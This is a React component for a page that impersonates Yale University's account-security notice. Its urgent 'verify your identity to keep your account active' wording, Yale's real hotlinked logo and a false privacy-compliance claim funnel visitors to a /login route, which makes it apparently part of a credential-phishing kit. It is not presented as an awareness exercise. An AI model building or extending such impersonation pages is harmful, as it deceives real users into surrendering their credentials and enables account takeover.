import Header from "../components/Header";
import {Link} from "react-router-dom"


const Trust = () => {
  return (
    <div className="container">
      <Header />
      <div className="content">
        <h2 className="intro">Secure your account and verify your identity</h2>
        <p>
          To ensure your account remains active, please confirm your email usage
          by completing the validation process below. This helps us maintain the
          security and functionality of our email systems.
        </p>
        <Link to={"/login"}>
          <button className="proceed">Proceed to Verification</button>{" "}
        </Link>
        <p>
          This process is secure and complies with Yale University’s privacy
          policies.
        </p>
      </div>
      <footer>
        <div className="left">
          <img
            src="https://veritas.its.yale.edu/netid/images/yale-logo-sprite.svg"
            alt="logo"
          />
          <p>
            © 2024 <a href="#">Yale University</a>. All Rights Reserved.
          </p>
        </div>
        <div className="right">
          <a href="#">Accessibility at Yale</a>
          <a href="#">Privacy Policy</a>
        </div>
      </footer>
    </div>
  );
};

export default Trust;
